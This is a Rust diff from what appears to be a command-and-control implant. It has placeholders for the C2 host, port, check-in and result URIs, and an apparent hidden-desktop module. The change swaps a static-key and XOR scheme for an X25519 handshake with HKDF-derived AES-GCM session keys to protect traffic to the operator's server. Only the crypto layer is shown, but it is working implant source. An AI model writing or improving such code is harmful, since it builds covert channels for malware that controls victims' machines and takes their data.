@@ -6,13 +6,16 @@ mod hdesktop;
 use aes_gcm::{Aes256Gcm, KeyInit, Nonce};
 use aes_gcm::aead::Aead;
 use base64::{Engine as _, engine::general_purpose::STANDARD as B64};
-use sha2::{Sha256, Digest};
+use hmac::{Hmac, Mac};
+use sha2::Sha256;
 use serde_json::{json, Value};
 use std::io::{Read, Write};
 use std::net::TcpStream;
 use std::process::Command;
+use std::sync::Mutex;
 use std::time::Duration;
 use std::thread;
+use x25519_dalek::{PublicKey, StaticSecret};
 
 const EP: &str = "{{C2_HOST}}";
 const PT: &str = "{{C2_PORT}}";
@@ -25,42 +28,86 @@ const P2: &str = "{{CHECKIN_URI}}";
 const P3: &str = "{{RESULT_URI}}";
 const UA: &str = "{{USER_AGENT}}";
 
-fn derive_key() -> [u8; 32] {
-    let mut hasher = Sha256::new();
-    hasher.update(AK.as_bytes());
-    let result = hasher.finalize();
+const SERVER_PUB: &str = "17e9833c7357d12649195085ebb2cb1dd68bfbffc86f9a930164eb4239686e1c";
+type HmacSha256 = Hmac<Sha256>;
+struct Wire {
+    eph: Option<StaticSecret>,
+    hs: Option<[u8; 32]>,
+    session: Option<[u8; 32]>,
+}
+static WIRE: Mutex<Wire> = Mutex::new(Wire { eph: None, hs: None, session: None });
+
+fn hkdf(ikm: &[u8], salt: &[u8], info: &[u8]) -> [u8; 32] {
+    let mut mac = <HmacSha256 as Mac>::new_from_slice(salt).unwrap();
+    mac.update(ikm);
+    let prk = mac.finalize().into_bytes();
+    let mut mac = <HmacSha256 as Mac>::new_from_slice(&prk).unwrap();
+    mac.update(info);
+    mac.update(&[1]);
+    let out = mac.finalize().into_bytes();
     let mut key = [0u8; 32];
-    key.copy_from_slice(&result);
+    key.copy_from_slice(&out);
     key
 }
-
-fn enc(pt: &str) -> String {
-    let key = derive_key();
-    let cipher = Aes256Gcm::new_from_slice(&key).unwrap();
+fn seal(key: &[u8], text: &str) -> Vec<u8> {
+    let cipher = Aes256Gcm::new_from_slice(key).unwrap();
     let mut nonce_bytes = [0u8; 12];
     getrandom(&mut nonce_bytes);
-    let nonce = Nonce::from_slice(&nonce_bytes);
-    let ct = cipher.encrypt(nonce, pt.as_bytes()).unwrap();
-    let mut result = Vec::with_capacity(4 + 12 + ct.len());
-    result.extend_from_slice(b"AES1");
-    result.extend_from_slice(&nonce_bytes);
-    result.extend_from_slice(&ct);
-    B64.encode(&result)
+    let ct = cipher.encrypt(Nonce::from_slice(&nonce_bytes), text.as_bytes()).unwrap();
+    let mut out = nonce_bytes.to_vec();
+    out.extend(ct);
+    out
 }
-
-fn dec(encoded: &str) -> Option<String> {
-    let raw = B64.decode(encoded.trim()).ok()?;
-    if raw.len() > 4 && &raw[..4] == b"AES1" {
-        let key = derive_key();
-        let cipher = Aes256Gcm::new_from_slice(&key).ok()?;
-        let nonce = Nonce::from_slice(&raw[4..16]);
-        let pt = cipher.decrypt(nonce, &raw[16..]).ok()?;
-        return String::from_utf8(pt).ok();
-    }
-    // XOR fallback for legacy server compat
-    let k = AK.as_bytes();
-    let pt: Vec<u8> = raw.iter().enumerate().map(|(i, b)| b ^ k[i % k.len()]).collect();
+fn open_blob(key: &[u8], blob: &[u8]) -> Option<String> {
+    if blob.len() < 28 { return None; }
+    let cipher = Aes256Gcm::new_from_slice(key).ok()?;
+    let pt = cipher.decrypt(Nonce::from_slice(&blob[..12]), &blob[12..]).ok()?;
     String::from_utf8(pt).ok()
+}
+fn enc(pt: &str) -> String {
+    let mut w = WIRE.lock().unwrap();
+    if let Some(key) = w.session {
+        let sealed = seal(&key, pt);
+        let mut raw = b"AES1".to_vec();
+        raw.extend(sealed);
+        return B64.encode(raw);
+    }
+    let server_bytes = hex::decode(SERVER_PUB).unwrap();
+    let server = PublicKey::from(<[u8; 32]>::try_from(server_bytes.as_slice()).unwrap());
+    let eph = StaticSecret::random_from_rng(rand::rngs::OsRng);
+    let eph_pub = PublicKey::from(&eph);
+    let shared = eph.diffie_hellman(&server);
+    let hs = hkdf(shared.as_bytes(), b"sockpuppets-salt-v1", b"sockpuppets-handshake-v1");
+    let sealed = seal(&hs, pt);
+    let mut raw = eph_pub.as_bytes().to_vec();
+    raw.extend(sealed);
+    w.eph = Some(eph);
+    w.hs = Some(hs);
+    format!("EPH1.{}", B64.encode(raw))
+}
+fn dec(encoded: &str) -> Option<String> {
+    let encoded = encoded.trim();
+    let mut w = WIRE.lock().unwrap();
+    if let Some(rest) = encoded.strip_prefix("EPH2.") {
+        let raw = B64.decode(rest).ok()?;
+        if raw.len() < 32 { return None; }
+        let hs = w.hs?;
+        let pt = open_blob(&hs, &raw[32..])?;
+        let srv = PublicKey::from(<[u8; 32]>::try_from(&raw[..32]).ok()?);
+        let eph = w.eph.take()?;
+        let shared2 = eph.diffie_hellman(&srv);
+        let mut ikm = shared2.as_bytes().to_vec();
+        ikm.extend(&hs);
+        w.session = Some(hkdf(&ikm, b"sockpuppets-salt-v1", b"sockpuppets-session-v1"));
+        w.hs = None;
+        return Some(pt);
+    }
+    let raw = B64.decode(encoded).ok()?;
+    if raw.len() > 4 && &raw[..4] == b"AES1" {
+        let key = w.session?;
+        return open_blob(&key, &raw[4..]);
+    }
+    None
 }
 
 fn getrandom(buf: &mut [u8]) {
